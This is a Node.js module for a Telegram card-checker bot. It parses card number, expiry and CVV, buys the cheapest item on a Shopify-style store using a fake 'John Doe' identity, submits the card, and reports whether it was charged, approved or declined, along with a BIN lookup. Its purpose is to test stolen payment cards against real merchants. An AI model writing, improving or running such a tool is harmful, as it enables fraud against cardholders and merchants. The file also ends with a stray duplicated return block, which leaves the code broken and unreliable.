const axios = require("axios");

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function escapeHTML(str) {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// Parse CC input
function parseCC(ccInput) {
  const parts = ccInput.split("|");
  if (parts.length < 4) return null;
  return {
    number: parts[0].trim(),
    month: parts[1].trim().padStart(2, "0"),
    year: parts[2].trim().length === 2 ? "20" + parts[2].trim() : parts[2].trim(),
    cvv: parts[3].trim()
  };
}

// Get cheapest product from store
async function getProduct(storeUrl) {
  try {
    const url = storeUrl.replace(/\/$/, "") + "/products.json?limit=50";
    const res = await axios.get(url, {
      timeout: 10000,
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
    });
    const products = res.data.products || [];
    if (products.length === 0) return null;

    // Find cheapest product with price <= 2.00
    let cheapest = null;
    for (const product of products) {
      for (const variant of product.variants) {
        const price = parseFloat(variant.price);
        if (price > 0 && price <= 2.00) {
          if (!cheapest || price < parseFloat(cheapest.price)) {
            cheapest = {
              id: variant.id,
              title: product.title,
              price: variant.price,
              variantId: variant.id
            };
          }
        }
      }
    }

    // If no cheap product, take first available
    if (!cheapest && products[0] && products[0].variants[0]) {
      const v = products[0].variants[0];
      cheapest = {
        id: v.id,
        title: products[0].title,
        price: v.price,
        variantId: v.id
      };
    }

    return cheapest;
  } catch(e) {
    console.log("[PRODUCT ERROR]", e.message);
    return null;
  }
}

// Create checkout
async function createCheckout(storeUrl, variantId) {
  try {
    const url = storeUrl.replace(/\/$/, "") + "/api/2023-10/graphql.json";

    // Try REST first
    const restUrl = storeUrl.replace(/\/$/, "") + "/cart/add.js";
    const cartRes = await axios.post(restUrl, {
      id: variantId,
      quantity: 1
    }, {
      timeout: 10000,
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
      }
    });

    // Create checkout
    const checkoutUrl = storeUrl.replace(/\/$/, "") + "/checkouts";
    const checkoutRes = await axios.post(checkoutUrl, {
      checkout: {
        line_items: [{ variant_id: variantId, quantity: 1 }],
        email: "test" + Date.now() + "@gmail.com",
        shipping_address: {
          first_name: "John",
          last_name: "Doe",
          address1: "123 Main St",
          city: "New York",
          province: "New York",
          country: "US",
          zip: "10001",
          phone: "5555555555"
        }
      }
    }, {
      timeout: 15000,
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json"
      }
    });

    return checkoutRes.data.checkout || null;
  } catch(e) {
    console.log("[CHECKOUT ERROR]", e.message);
    return null;
  }
}

// Submit payment
async function submitPayment(storeUrl, checkout, card) {
  try {
    const paymentUrl = storeUrl.replace(/\/$/, "") +
      "/checkouts/" + checkout.token + "/payments";

    const paymentRes = await axios.post(paymentUrl, {
      payment: {
        amount: checkout.total_price,
        payment_gateway_by_identifier: "shopify_payments",
        unique_token: "pay_" + Date.now(),
        credit_card: {
          number: card.number,
          first_name: "John",
          last_name: "Doe",
          month: parseInt(card.month),
          year: parseInt(card.year),
          verification_value: card.cvv
        },
        billing_address: {
          first_name: "John",
          last_name: "Doe",
          address1: "123 Main St",
          city: "New York",
          province: "New York",
          country: "US",
          zip: "10001",
          phone: "5555555555"
        }
      }
    }, {
      timeout: 20000,
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json"
      }
    });

    return paymentRes.data || null;
  } catch(e) {
    console.log("[PAYMENT ERROR]", e.message);
    return { error: e.message };
  }
}

// Check payment status
async function checkPaymentStatus(storeUrl, checkoutToken) {
  try {
    for (let i = 0; i < 5; i++) {
      await sleep(2000);
      const res = await axios.get(
        storeUrl.replace(/\/$/, "") + "/checkouts/" + checkoutToken,
        {
          timeout: 10000,
          headers: { "User-Agent": "Mozilla/5.0", "Accept": "application/json" }
        }
      );
      const checkout = res.data.checkout || {};
      if (checkout.payment_due === "0.00") return "APPROVED";
      if (checkout.payment_url) continue;
    }
    return "DECLINED";
  } catch(e) {
    return "DECLINED";
  }
}

// Classify response
function classifyResponse(responseText, approved) {
  const r = (responseText || "").toUpperCase();
  const approvedKw = ["APPROVED", "SUCCESS", "AUTHORIZED", "OTP_REQUIRED",
    "3DS_REQUIRED", "3D_SECURE", "AUTHENTICATION_REQUIRED", "PENDING", "REDIRECT"];
  const chargedKw = ["CHARGED", "CAPTURED", "PAID"];
  const declinedKw = ["DECLINED", "INSUFFICIENT", "DO NOT HONOR", "INVALID",
    "EXPIRED", "STOLEN", "BLOCKED", "RESTRICTED", "SECURITY"];

  if (approved) return "approved";
  let cat = "declined";
  for (const kw of chargedKw) if (r.includes(kw)) return "charged";
  for (const kw of approvedKw) if (r.includes(kw)) { cat = "approved"; break; }
  return cat;
}

// BIN lookup
async function getBinInfo(bin) {
  try {
    const r = await axios.get("https://lookup.binlist.net/" + bin, {
      timeout: 4000,
      headers: { "Accept-Version": "3" }
    });
    if (r.data) {
      return {
        brand: (r.data.scheme || "VISA").toUpperCase(),
        issuer: (r.data.bank?.name || "BANK").toUpperCase(),
        country: (r.data.country?.name || "USA").toUpperCase(),
        flag: r.data.country?.emoji || ""
      };
    }
  } catch(e) {}
  return { brand: "VISA", issuer: "BANK", country: "USA", flag: "" };
}

// MAIN CHECK FUNCTION
async function checkCard(ccInput, storeUrl, onStep) {
  const startTime = Date.now();

  // Default binInfo — always available
  let binInfo = { brand: "VISA", issuer: "BANK", country: "USA", flag: "" };

  const card = parseCC(ccInput);
  if (!card) {
    return {
      success: false,
      response: "INVALID_FORMAT",
      category: "declined",
      binInfo,
      timeTaken: "0.00",
      product: null
    };
  }

  const bin = card.number.substring(0, 6);

  // BIN fetch early — parallel me karo
  const binPromise = getBinInfo(bin).then(b => { binInfo = b; }).catch(() => {});

  // Step 1
  await onStep(
    "⏳ <b>Checking Card...</b>\n" +
    "━━━━━━━━━━━━━━━\n" +
    "<tg-emoji emoji-id=\"5195072744798051557\">💳</tg-emoji> <b>Card:</b> <code>" + ccInput + "</code>\n" +
    "━━━━━━━━━━━━━━━\n" +
    "<tg-emoji emoji-id=\"5213452215527677338\">⏳</tg-emoji> <b>[1/5]</b> Connecting to store...\n" +
    "⬜⬜⬜⬜⬜"
  );

  // Get product
  const product = await getProduct(storeUrl);
  if (!product) {
    await binPromise;
    return {
      success: false,
      response: "STORE_ERROR — Could not fetch products",
      category: "declined",
      binInfo,
      timeTaken: ((Date.now() - startTime) / 1000).toFixed(2),
      product: null
    };
  }

  // Step 2
  await onStep(
    "⏳ <b>Checking Card...</b>\n" +
    "━━━━━━━━━━━━━━━\n" +
    "<tg-emoji emoji-id=\"5195072744798051557\">💳</tg-emoji> <b>Card:</b> <code>" + ccInput + "</code>\n" +
    "━━━━━━━━━━━━━━━\n" +
    "✅ <b>[1/5]</b> Store connected!\n" +
    "<tg-emoji emoji-id=\"5213452215527677338\">⏳</tg-emoji> <b>[2/5]</b> Product: $" + product.price + "\n" +
    "🟩⬜⬜⬜⬜\n" +
    "🛒 <b>Item:</b> " + escapeHTML(product.title)
  );

  // Create checkout
  const checkout = await createCheckout(storeUrl, product.variantId);
  if (!checkout) {
    await binPromise;
    return {
      success: false,
      response: "CHECKOUT_ERROR — Could not create checkout",
      category: "declined",
      binInfo,
      timeTaken: ((Date.now() - startTime) / 1000).toFixed(2),
      product
    };
  }

  // Step 3
  await onStep(
    "⏳ <b>Checking Card...</b>\n" +
    "━━━━━━━━━━━━━━━\n" +
    "<tg-emoji emoji-id=\"5195072744798051557\">💳</tg-emoji> <b>Card:</b> <code>" + ccInput + "</code>\n" +
    "━━━━━━━━━━━━━━━\n" +
    "✅ <b>[1/5]</b> Store connected!\n" +
    "✅ <b>[2/5]</b> Product: $" + product.price + "\n" +
    "<tg-emoji emoji-id=\"5213452215527677338\">⏳</tg-emoji> <b>[3/5]</b> Checkout created...\n" +
    "🟩🟩⬜⬜⬜\n" +
    "🔑 Token: <code>" + checkout.token.substring(0, 10) + "...</code>"
  );

  // Submit payment
  const payment = await submitPayment(storeUrl, checkout, card);

  // Step 4
  await onStep(
    "⏳ <b>Checking Card...</b>\n" +
    "━━━━━━━━━━━━━━━\n" +
    "<tg-emoji emoji-id=\"5195072744798051557\">💳</tg-emoji> <b>Card:</b> <code>" + ccInput + "</code>\n" +
    "━━━━━━━━━━━━━━━\n" +
    "✅ <b>[1/5]</b> Store connected!\n" +
    "✅ <b>[2/5]</b> Product: $" + product.price + "\n" +
    "✅ <b>[3/5]</b> Checkout ready!\n" +
    "<tg-emoji emoji-id=\"5213452215527677338\">⏳</tg-emoji> <b>[4/5]</b> Submitting card...\n" +
    "🟩🟩🟩⬜⬜"
  );

  // Get result
  let finalResponse = "DECLINED";
  let category = "declined";

  if (payment && !payment.error) {
    const status = await checkPaymentStatus(storeUrl, checkout.token);
    const rawResp =
      payment.payment?.message ||
      payment.payment?.response ||
      payment.transaction?.message ||
      status || "DECLINED";
    finalResponse = String(rawResp).toUpperCase();
    category = classifyResponse(finalResponse, status === "APPROVED");
  } else if (payment && payment.error) {
    finalResponse = payment.error.toUpperCase();
    category = classifyResponse(finalResponse, false);
  }

  // Step 5
  await onStep(
    "⏳ <b>Checking Card...</b>\n" +
    "━━━━━━━━━━━━━━━\n" +
    "<tg-emoji emoji-id=\"5195072744798051557\">💳</tg-emoji> <b>Card:</b> <code>" + ccInput + "</code>\n" +
    "━━━━━━━━━━━━━━━\n" +
    "✅ <b>[1/5]</b> Store connected!\n" +
    "✅ <b>[2/5]</b> Product: $" + product.price + "\n" +
    "✅ <b>[3/5]</b> Checkout ready!\n" +
    "✅ <b>[4/5]</b> Card submitted!\n" +
    "<tg-emoji emoji-id=\"5213452215527677338\">⏳</tg-emoji> <b>[5/5]</b> Getting result...\n" +
    "🟩🟩🟩🟩⬜"
  );

  await new Promise(r => setTimeout(r, 1000));

  // Wait for BIN
  await binPromise;

  return {
    success: true,
    response: finalResponse,
    category,
    product,
    binInfo,
    timeTaken: ((Date.now() - startTime) / 1000).toFixed(2)
  };
}
  return {
    success: true,
    response: finalResponse,
    category: category,
    product: product,
    binInfo: binInfo,
    timeTaken: timeTaken
  };
}

module.exports = { checkCard, classifyResponse };
